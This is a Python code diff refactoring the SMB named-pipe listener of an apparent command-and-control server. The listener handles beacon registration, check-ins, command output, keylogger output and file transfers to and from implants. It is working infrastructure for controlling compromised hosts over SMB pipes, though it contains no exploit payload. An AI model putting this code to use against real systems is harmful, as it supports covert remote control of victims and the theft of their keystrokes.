@@ -23,26 +23,27 @@ class SMBNamedPipeHandler:
             initial_data_raw = self._read_from_pipe(pipe_handle, self.receiver_instance.config.buffer_size)
             if not initial_data_raw:
                 return
-                
-            # Decode the data
-            try:
+            
+            # Use unified data processing
+            client_info_extended = {**client_info, "transport": "smb"}
+            response_bytes, keep_alive = self.receiver_instance.process_received_data(initial_data_raw, client_info_extended)
+            
+            # Handle file transfer case
+            if response_bytes == b"FILE_TRANSFER_REQUIRED":
                 initial_data_decoded = self.receiver_instance.encoding_strategy.decode(initial_data_raw)
                 initial_data = initial_data_decoded.decode('utf-8').strip()
-            except Exception as e:
-                if utils.logger:
-                    utils.logger.log_message(f"SMB decoding error from {client_info}: {e}")
-                return
-                
-            parts = initial_data.split('|')
-            command = parts[0] if parts else ""
-            
-            # Update stats using thread-safe method
-            self.receiver_instance.update_bytes_received(len(initial_data_raw))
-            
-            if command in ("to_beacon", "from_beacon"):
+                parts = initial_data.split('|')
+                command = parts[0] if parts else ""
                 self.receiver_instance.handle_file_transfer_smb(pipe_handle, command, parts, client_info)
-            else:
-                self.receiver_instance.handle_command_processing_smb(pipe_handle, initial_data, client_info)
+                return
+            
+            # Send response through pipe
+            self._write_to_pipe(pipe_handle, response_bytes)
+            self.receiver_instance.update_bytes_sent(len(response_bytes))
+            
+            # Handle persistent connections if needed
+            if keep_alive:
+                self._handle_persistent_pipe_connection(pipe_handle, client_info_extended)
                 
         except Exception as e:
             if utils.logger:
@@ -52,6 +53,44 @@ class SMBNamedPipeHandler:
                 self._close_pipe(pipe_handle)
             except:
                 pass
+    
+    def _handle_persistent_pipe_connection(self, pipe_handle, client_info: Dict[str, Any]):
+        """Handle persistent SMB pipe connection for multiple messages"""
+        timeout_count = 0
+        max_timeouts = 10
+        
+        while timeout_count < max_timeouts and not self.receiver_instance._shutdown_event.is_set():
+            try:
+                data_raw = self._read_from_pipe(pipe_handle, self.receiver_instance.config.buffer_size)
+                if not data_raw:
+                    timeout_count += 1
+                    time.sleep(0.1)
+                    continue
+                
+                response_bytes, keep_alive = self.receiver_instance.process_received_data(data_raw, client_info)
+                
+                # Handle file transfer requests
+                if response_bytes == b"FILE_TRANSFER_REQUIRED":
+                    initial_data_decoded = self.receiver_instance.encoding_strategy.decode(data_raw)
+                    initial_data = initial_data_decoded.decode('utf-8').strip()
+                    parts = initial_data.split('|')
+                    command = parts[0] if parts else ""
+                    self.receiver_instance.handle_file_transfer_smb(pipe_handle, command, parts, client_info)
+                    continue
+                
+                # Send response
+                self._write_to_pipe(pipe_handle, response_bytes)
+                self.receiver_instance.update_bytes_sent(len(response_bytes))
+                
+                if not keep_alive:
+                    break
+                    
+                timeout_count = 0  # Reset timeout counter
+                
+            except Exception as e:
+                if utils.logger:
+                    utils.logger.log_message(f"Error in persistent SMB connection from {client_info}: {e}")
+                break
     
     def _read_from_pipe(self, pipe_handle, buffer_size: int) -> bytes:
         """Read data from named pipe (platform-specific implementation)"""
@@ -406,103 +445,7 @@ class SMBReceiver(BaseReceiver):
             self.connection_handler._write_to_pipe(pipe_handle, ready_response)
             self._receive_file_smb(pipe_handle, filename)
     
-    def handle_command_processing_smb(self, pipe_handle, initial_data: str, client_info: Dict[str, Any]):
-        """Handle SMB command processing"""
-        try:
-            keep_alive = self._process_command_smb(pipe_handle, initial_data)
-            if not keep_alive:
-                return
-                
-            # For SMB pipes, we typically handle one command per connection
-            # But we can implement a simple loop for keep-alive commands
-            timeout_count = 0
-            max_timeouts = 10
-            
-            while timeout_count < max_timeouts and not self._shutdown_event.is_set():
-                try:
-                    data_raw = self.connection_handler._read_from_pipe(pipe_handle, self.config.buffer_size)
-                    if not data_raw:
-                        timeout_count += 1
-                        time.sleep(0.1)
-                        continue
-                        
-                    data_decoded = self.encoding_strategy.decode(data_raw)
-                    data = data_decoded.decode('utf-8').strip()
-                    self.update_bytes_received(len(data_raw))
-                    
-                    keep_alive = self._process_command_smb(pipe_handle, data)
-                    if not keep_alive:
-                        break
-                    timeout_count = 0  # Reset timeout counter
-                        
-                except Exception as e:
-                    if utils.logger:
-                        utils.logger.log_message(f"Error processing SMB command from {client_info}: {e}")
-                    break
-                    
-        except Exception as e:
-            if utils.logger:
-                utils.logger.log_message(f"Error in SMB command handler for {client_info}: {e}")
-    
-    def _process_command_smb(self, pipe_handle, data: str) -> bool:
-        """Process SMB pipe commands"""
-        single_transaction_commands = {
-            "register", "request_action", "checkin", "command_output", "keylogger_output"
-        }
-        
-        parts = data.split('|')
-        if not parts:
-            error_response = self.encoding_strategy.encode(b"Invalid command format")
-            self.connection_handler._write_to_pipe(pipe_handle, error_response)
-            self.update_bytes_sent(len(error_response))
-            return False
-            
-        command = parts[0]
-        
-        try:
-            # Use existing command processor logic
-            if command == "command_output" and len(parts) >= 2:
-                beacon_id = parts[1]
-                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
-                response = self.command_processor.process_command_output(beacon_id, output)
-            elif command == "keylogger_output" and len(parts) >= 2:
-                beacon_id = parts[1]
-                output = data.split('|', 2)[2] if len(parts) > 2 else ""
-                response = self.command_processor.process_keylogger_output(beacon_id, output)
-            else:
-                # Standard command dispatch
-                response = {
-                    "register": lambda: self.command_processor.process_registration(
-                        parts[1], parts[2], self.receiver_id, self.name
-                    ) if len(parts) == 3 else "Invalid registration format",
-                    
-                    "request_action": lambda: self.command_processor.process_action_request(
-                        parts[1], self.receiver_id, self.name
-                    ) if len(parts) == 2 else "Invalid request format",
-                    
-                    "download_complete": lambda: self.command_processor.process_download_status(
-                        parts[1], parts[2], "download_complete"
-                    ) if len(parts) == 3 else "Invalid download status format",
-                    
-                    "download_failed": lambda: self.command_processor.process_download_status(
-                        parts[1], parts[2], "download_failed"
-                    ) if len(parts) == 3 else "Invalid download status format",
-                    
-                    "checkin": lambda: "Check-in acknowledged"
-                        if len(parts) == 2 else "Invalid checkin format",
-                }.get(command, lambda: "Unknown command")()
-                
-            # Encode and send response
-            encoded_response = self.encoding_strategy.encode(response.encode('utf-8'))
-            self.connection_handler._write_to_pipe(pipe_handle, encoded_response)
-            self.update_bytes_sent(len(encoded_response))
-            
-            return command not in single_transaction_commands
-            
-        except Exception as e:
-            if utils.logger:
-                utils.logger.log_message(f"Error processing SMB command {command}: {e}")
-            return False
+    # Note: SMB command processing now uses the unified process_received_data() method from BaseReceiver
     
     def _send_file_smb(self, pipe_handle, filename: str) -> bool:
         """Send file through SMB pipe"""
